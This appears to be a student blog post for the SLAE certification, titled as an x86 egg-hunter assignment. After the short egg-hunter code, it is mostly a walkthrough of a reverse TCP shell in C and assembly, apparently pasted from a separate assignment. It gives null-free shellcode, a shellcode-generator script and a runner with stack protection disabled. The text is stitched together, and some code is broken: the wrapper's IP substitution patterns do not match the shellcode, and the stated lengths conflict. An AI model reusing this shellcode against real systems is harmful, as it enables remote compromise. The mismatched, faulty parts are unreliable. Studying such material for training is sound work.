---
title:  "SLAE x86 Assignment 3: Egg Hunter"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### Egg Hunter
------

* Learn about the Egg Hunter technique
* Create a working demo of the Egg Hunter
* Should be easily configurable for different payloads

#### Concept 
-----

Egg hunting is the technique whereby an Egg Hunter is used to hunt for the actual payload to be executed, which in this case is marked or tagged by an egg. 

The technique is used to avoid the limitation of consecutive memory locations available to insert the payload after an overwrite (typically seen in a Stack-based Buffer Overlfow). Once the Egg Hunter is executed it searches for the egg which is prefixed with the larger payload - effectively triggering the execution of the payload.

![Reverse Shell](/assets/images/EggHunter.jpg)

Caveats to an Egg Hunter, it must avoid locating itself in memory and jumping to the incorrect address, it must be robust, small in size and fast. A 4 byte egg can be used and repeated twice to mark the payload, the Virtual Address Space (VAS) is searched for these two consecutive tags and redirects execution flow once the pattern is matched.

The popular paper by Skape was referenced to better understand the implementation of the Egg Hunter, the link to the research can be found [here] [skape-link].

[skape-link]: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

#### Access Syscall
----

A look up in the header file reveals the values for the access syscall:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep access
#define __NR_access		 33
```

The definition of the access syscall function in the man pages describes the arguments required:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man access

ACCESS(2)                                  Linux Programmer's Manual                                 ACCESS(2)

NAME
       access - check real user's permissions for a file

SYNOPSIS
       #include <unistd.h>

       int access(const char *pathname, int mode);

DESCRIPTION
       access()  checks  whether  the calling process can access the file pathname.  If pathname is a symbolic
       link, it is dereferenced.

       The mode specifies the accessibility check(s) to be performed, and is either the value F_OK, or a  mask
       consisting  of  the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of
       the file.  R_OK, W_OK, and X_OK test whether the file exists and grants read, write, and  execute  per-
       missions, respectively.

       The  check  is  done  using the calling process's real UID and GID, rather than the effective IDs as is
       done when actually attempting an operation (e.g., open(2)) on the file.  This allows  set-user-ID  pro-
       grams to easily determine the invoking user's authority.

       If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for
       a regular file if execute permission is enabled for any of the file owner, group, or other.

RETURN VALUE
       On success (all requested permissions granted), zero is returned.  On error (at least one bit  in  mode
       asked  for a permission that is denied, or some other error occurred), -1 is returned, and errno is set
       appropriately.

ERRORS
       access() shall fail if:

       EACCES The requested access would be denied to the file, or search permission is denied for one of  the
              directories in the path prefix of pathname.  (See also path_resolution(7).)

       ELOOP  Too many symbolic links were encountered in resolving pathname.

       ENAMETOOLONG
              pathname is too long.

       ENOENT A component of pathname does not exist or is a dangling symbolic link.

       ENOTDIR
              A component used as a directory in pathname is not, in fact, a directory.

       EROFS  Write permission was requested for a file on a read-only file system.

       access() may fail if:

       EFAULT pathname points outside your accessible address space.
```

Note is made of the fact that EFAULT (0xf2) should be avoided, as the error states the pathname would point outside the accessible address space.

#### Assembly Code (Updating the Skape code reference)
-------------

````nasm
; Filename: egghunter.nasm
; Author: h3ll0clar1c3
; Purpose: Egghunter, spawning a shell on the local host
; Compilation: ./compile.sh egghunter
; Usage: ./egghunter
; Shellcode size: ?? bytes
; Architecture: x86

global   _start

section .text
        _start:

	; initialize register
	xor edx, edx
	
	next_page:
	or dx, 0xfff		; set dx to 4095
	
	next_address:
	inc edx			; incdx to 4096 (PAGE_SIZE)
	lea ebx, [edx +0x4]	; load 0x1004 into ebx
	push byte +0x21		; 0x21 is dec 33 (access syscall)
	pop eax			; put the syscall value into eax
	int 0x80		; call the interrupt, execute the syscall
	
	cmp al, 0xf2		; check if return value is EFAULT (0xf2)
	jz next_page		; if EFAULT is encountered, jump back to next_page 
	mov eax, 0x50905090	; move unique egg value into eax
	mov edi, edx
	scasd			; search for first 4 byte pattern of the egg
	jnz next_address
	scasd			; search for second 4 byte pattern of the egg
	jnz next_address
	jmp edi			; jump to egg payload
````

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh egghunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

#### Customize Shellcode 
------

Objdump is used to extract the shellcode from the Egg Hunter in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
```



























#### Reverse TCP Shell in C
--------

The following C skeleton code will be used to demonstrate the Reverse TCP shell from a high-level language perspective. 

This will be used as a template for the low-level assembly code to follow:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    // Declare variables
    int sockfd;
    struct sockaddr_in serv_addr;
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // IP address family
    serv_addr.sin_family = AF_INET;
    // Destination IP address
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    // Destination port 
    serv_addr.sin_port = htons(4444);
    // Reverse connect to target IP address
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    int i;
    for (i=0; i <= 2; i++){
        dup2(sockfd, i);
    }
    // Execute /bin/sh using execve  
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}
```

#### POC (C Code)
------

The C code is compiled as an executable ELF binary and executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc reverse_shell_tcp_poc.c -o reverse_shell_tcp_poc
osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_poc 

```

A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):

```bash
osboxes@osboxes:~$ nc -lv 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### Reverse TCP Shell in Assembly
--------------

Strace is used to debug and monitor the interactions between the executable process and the Linux kernel, visually showing the system calls for the Reverse TCP shell:

```bash
osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,connect,dup2,execve ./reverse_shell_tcp_poc 
execve("./reverse_shell_tcp_poc", ["./reverse_shell_tcp_poc"], [/* 21 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
```

Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:

* socket -> Creates a socket
* connect -> Initiates a connection on a socket
* dup2 -> Redirects STDIN, STDOUT, and STDERR to the incoming client connection
* execve -> Executes a shell

The syscalls in the C code relate to the following numbers as referenced below in the header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ egrep "execve|dup2|socketcall" /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_execve		 11
#define __NR_dup2		 63
#define __NR_socketcall		102
```

A socketcall is defined in the man pages requiring 2 arguments, call and args:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man socketcall

SOCKETCALL(2)                              Linux Programmer's Manual                             SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is a common kernel entry point for the socket system calls.  call determines which socket
       function to invoke.  args points to a block containing the actual arguments, which are  passed  through
       to the appropriate call.
```

A look up in the net header file reveals the values for the socket and connect syscalls:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/linux/net.h

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
```

Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves (sets their values to '0'):

```nasm
	; initialize registers
	xor eax, eax
	xor ebx, ebx
```

#### 1st Syscall (Create Socket)
----

To create the socket syscall, a value is needed in the EAX register to call socket:

```bash 
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall	102
```

The header file reveals the code for socket is 102. Converting 102 from decimal to hex equates to the hex equivalent of 0x66, this value will be placed in the lower half of EAX.

The next values are that of the socket properties as defined. The integer values for type (SOCK_STREAM) and domain (AF_INET/PF_INET) can be found in the socket header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define	PF_INET		2	/* IP protocol family.  */
```

The last argument value for int protocol is going to be ‘0’ to accept any protocol according to the man pages definition for socket: 

```nasm
        ; push socket values onto the stack
        push eax	; push 0 onto the stack, default protocol		
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
```

The newly created socket can be identified by storing the value of EAX into the EDX register as reference for a later stage (with the ability to use EAX in subsequent system calls):

```nasm
	mov edx, eax	; save the return value
```

1st Syscall (Assembly code section):

```nasm
	; 1st syscall - create socket (sockaddr_in struct)	
        mov al, 0x66	; hex value for socket
        mov bl, 0x1     ; socket
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to create the socket, execute the syscall
        mov edx, eax    ; save the return value 
```

#### 2nd Syscall (Connect Socket to IP/Port in Sockaddr Struct)
-----

The connect syscall in the Reverse TCP shell essentially encompasses the bind, accept, and listen syscalls in the Bind TCP shell from Assignment 1.

The definition of the connect syscall function in the man pages describes the arguments required:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man connect

CONNECT(2)                                 Linux Programmer's Manual                                CONNECT(2)

NAME
       connect - initiate a connection on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);

DESCRIPTION
       The  connect() system call connects the socket referred to by the file descriptor sockfd to the address
       specified by addr.  The addrlen argument specifies the size of addr.  The format of the address in addr
       is determined by the address space of the socket sockfd; see socket(2) for further details.
```

The 3 arguments required:

* int sockfd -> A reference to the newly created socket (EAX was moved into EDX)
* const struct sockaddr *addr -> A pointer to the location on the stack of the sockaddr struct to be created
* socklen_t addrlen -> The length of an IP socket address is 16  

The structure for handling internet addresses can be viewed via the man pages in the header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/netinet/in.h

/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
struct sockaddr_in {
  __kernel_sa_family_t	sin_family;	/* Address family		*/
  __be16		sin_port;	/* Port number			*/
  struct in_addr	sin_addr;	/* Internet address		*/
```

4 structures can be defined:

* struct sockaddr 
* AF_INET (Address family)
* Port Number
* Internet address

Since the stack grows from High to Low memory it is important to remember to place these arguments onto the stack in reverse order.

The Internet address will be set to 127.0.0.1 (listening machine), the value 0xffffffff is moved into EDI.

The XOR'd value of 127.0.0.1 (0xfeffff80) is then pushed onto the stack in reverse order.

The chosen port number will need to be converted from decimal 4444 to hex 115C, which equates to 0x5c11 in Little Endian format.

The chosen port number is then pushed onto the stack as the next argument. The word value 0x5c11 relates to port number 4444 in Little Endian format. 

The word value of 0x2 is pushed onto the stack which loads the value for AF_INET executing the syscall, which completes the creation of sockaddr struct.

The ESP stack pointer (top of the stack) is moved into the ECX register to store the const struct sockaddr *addr argument. 

The value of 16 (struct sockaddr) is then pushed onto the stack, along with the pointers to sockaddr pushed onto the stack:

```nasm
	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
        push edi	; push XOR'd value onto the stack
        push word 0x5c11; port 4444 is set
        push word 0x2   ; AF_INET = 2
        mov ecx, esp    ; pointer to the arguments
        push 0x16	; length of sockaddr struct, 16
        push ecx        ; push pointer to sockaddr
        push edx        ; push pointer to sockfd
```    
    
The next instruction set moves the hex value for the socket function into the lower half of EAX, which is required for the connect syscall:

```nasm
	mov al, 0x66	; hex value for socket
```
    
Followed by an instruction to call the interrupt to execute the connect syscall: 

```nasm
    	mov bl, 3       ; sys_connect = 3
        mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the connect syscall
```

2nd Syscall (Assembly code section):

```nasm
	; 2nd syscall - connect socket to IP/Port in sockaddr struct
	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
        push edi	; push XOR'd value onto the stack
        push word 0x5c11; port 4444 is set
        push word 0x2   ; AF_INET = 2
        mov ecx, esp    ; pointer to the arguments
        push 0x16	; length of sockaddr struct, 16
        push ecx        ; push pointer to sockaddr
        push edx        ; push pointer to sockfd
        mov al, 0x66    ; hex value for socket
	mov bl, 3 	; sys_connect = 3
	mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the connect syscall
```

#### 3rd Syscall (Duplicate File Descriptors for STDIN, STDOUT and STDERR)
------

The dup2 syscall works by creating a loop, and iterating 3 times to accommodate all 3 file descriptors loading into the accepted connection (providing an interactive reverse shell session).

To redirect IO to the descriptor, a loop is initiated with the ECX register, commonly known as the counter register. 

The dup2 syscall code can be found in the header file below, converting 63 from decimal to hex equals 0x3f:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2 
#define __NR_dup2 63
```

All required arguments of dup2 are in sockfd (stored in connect syscall), which will be moved into EBX.

The syscall code of 0x3f is moved in the lower part of the EAX memory region.

Whilst the signed flag is not set (JNS) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0).

3rd syscall (Assembly code section):

```nasm
	; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0
```

#### 4th Syscall (Execute /bin/sh using Execve) 
------

The final syscall instructs the program to execute the execve syscall which essentially points to '/bin/sh'. 

The execve syscall is defined by the man pages as follows:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man execve

EXECVE(2)                              Linux Programmer's Manual                             EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve()  executes  the  program pointed to by filename.  filename must be either a binary exe-
       cutable, or a script starting with a line of the form:

           #! interpreter [optional-arg]

       For details of the latter case, see "Interpreter scripts" below.

       argv is an array of argument strings passed to the new program.  By convention,  the  first  of
       these  strings should contain the filename associated with the file being executed.  envp is an
       array of strings, conventionally of the form key=value, which are passed as environment to  the
       new program.  Both argv and envp must be terminated by a NULL pointer.  The argument vector and
       environment can be accessed by the called program's main function, when it is defined as:

           int main(int argc, char *argv[], char *envp[])
```

This objective is achieved when a reverse connection is made to the newly created socket port, in turn executing an interactive shell for an attacker on the target machine.

This instruction set will load the string '/bin/sh' onto the stack in reverse order, since the stack grows from high to low memory.

The execve syscall works with Null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting the value to '0':

```nasm
	xor eax, eax	; clear register
	push eax	; terminator placed onto the stack with value of 0
```

Before placing the string '/bin/sh' onto the stack (reverse order), it is important to remember to avoid Null Bytes and add padding where possible in the shellcode. 

To ensure that the string is divisible by 4, an additional character '/' is added to increase the characters from 7 to 8 resulting in '//bin/sh'.

Python can be used to interpret and extract the hex address, along with splitting the string up into 4 byte halves (clean hex address to use for the calls):

```python
osboxes@osboxes:~/Downloads/SLAE$ python
Python 2.7.3 (default, Feb 27 2014, 20:00:17) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = '//bin/sh'
>>> a[::-1]
'hs/nib//'
>>> import binascii
>>> binascii.hexlify(b'hs/n')
'68732f6e'
>>> binascii.hexlify(b'ib//')
'69622f2f'
```

After the Null terminator has been pushed onto the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):

```nasm
	push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
```

The EBX register will be used to carry the pointer location of the '//bin/sh' entity, which points EBC to the stack:

```nasm
	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
```

Null out the EAX register by clearing the ECX and EDX registers:

```nasm
	xor ecx, ecx    ; clear ecx register
        xor edx, edx    ; clear edx register
```

The execve syscall code can be found in the header file below, converting 11 from decimal to hex equals 0xb:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```

The value of 0xb is placed into the lower memory region of EAX.

Finally, the execve syscall and the program interrupt are called to execute the program, and initiate the full Reverse TCP shell on the target machine:

```nasm
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
```

4th syscall (Assembly code section):

```nasm
	; 4th syscall - execute /bin/sh using execve
        xor eax, eax    ; clear eax register
        push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
        mov byte [esp + 11], al
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
	xor ecx, ecx    ; clear ecx register
        xor edx, edx    ; clear edx register
        mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
```

#### Assembly Code (Final)
-------------

````nasm
; Filename: reverse_shell_tcp.nasm
; Author: h3ll0clar1c3
; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444
; Compilation: ./compile.sh reverse_shell_tcp
; Usage: ./reverse_shell_tcp
; Testing: nc -lv 4444
; Shellcode size: 92 bytes
; Architecture: x86

global   _start

section .text
        _start:

	; initialize registers
	xor eax, eax
	xor ebx, ebx

        ; push socket values onto the stack
        push eax	; push 0 onto the stack, default protocol		
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
	
        ; 1st syscall - create socket (sockaddr_in struct)	
        mov al, 0x66            ; hex value for socket
        mov bl, 0x1             ; socket
        mov ecx, esp            ; pointer to the arguments pushed
        int 0x80                ; call the interrupt to create the socket, execute the syscall
        mov edx, eax            ; save the return value 

        ; 2nd syscall - connect socket to IP/Port in sockaddr struct
	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
        push edi	; push XOR'd value onto the stack
        push word 0x5c11; port 4444 is set
        push word 0x2   ; AF_INET = 2
        mov ecx, esp    ; pointer to the arguments
        push 0x16	; length of sockaddr struct, 16
        push ecx        ; push pointer to sockaddr
        push edx        ; push pointer to sockfd
        mov al, 0x66    ; hex value for socket
	mov bl, 3 	; sys_connect = 3
	mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the connect syscall

        ; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0

        ; 4th syscall - execute /bin/sh using execve
        xor eax, eax    ; clear eax register
        push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
        mov byte [esp + 11], al
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
	xor ecx, ecx    ; clear ecx register
        xor edx, edx    ; clear edx register
        mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
````

#### POC (Assembly Code) 
------

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```
The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh reverse_shell_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

The compiled ELF binary is executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp 

```

A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):

```bash
osboxes@osboxes:~$ nc -lv 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### Configurable IP Address and Port (Customize Shellcode) 
------

Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./reverse_shell_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the IP address and port number are easily configurable. 

This can be achieved by utilising a Python wrapper which XOR's the given IP address with a key, and takes a standard 2 byte port number and checks the chosen port number to ensure the custom port is valid.

The shellcode variable defined within the script includes the original hardcoded shellcode for port 4444:

```python 
#!/usr/bin/python

# Filename: reverse_shell_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable IP address and port number
# Usage: python reverse_shell_tcp_wrapper.py <IP address> <port>

import socket
import sys
import struct

shellcode = """
\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xbf\\xff
\\xff\\xff\\xff\\x81\\xf7\\x80\\xff\\xff\\xfe\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16
\\x51\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80
\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x88\\x44\\x24\\x0b\\x89\\xe3
\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80
"""

if (len(sys.argv) < 3):
    print "Usage: python {name} <IP address> <port>".format(name = sys.argv[0])
    exit()

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte!'
    exit(1)

# Inject the XOR bytes
shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

shellcode = shellcode.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Port
port = int(sys.argv[2])

if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    exit()
 
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

# Execute
print("Generated shellcode using custom IP: " + sys.argv[1] + " and custom port: " + sys.argv[2])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"
```

The Python code dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 

```bash
osboxes@osboxes:~/Downloads/SLAE/Assignment_2$ python reverse_shell_tcp_wrapper.py 127.0.0.1 5555
Generated shellcode using custom IP: 127.0.0.1 and custom port: 5555

\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff
\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16
\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80
\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3
\x31\xc9\x31\xd2\xb0\x0b\xcd\x80

Shellcode length: 374 bytes
No nulls detected
```

A simple C program scripted and edited with the newly generated shellcode:

```c
/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
* Usage: ./reverse_shell_tcp_final
* Testing: nc -lv 5555
* Shellcode size: 92 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] =
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff"
"\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03"
"\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"
"\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
    printf("Shellcode length: %d bytes\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
```

#### POC (Final Shellcode) 
------

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 92 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
Shellcode length: 92 bytes

```

A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 5555):

```bash
osboxes@osboxes:~$ nc -lv 5555
Connection from 127.0.0.1 port 5555 [tcp/*] accepted
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
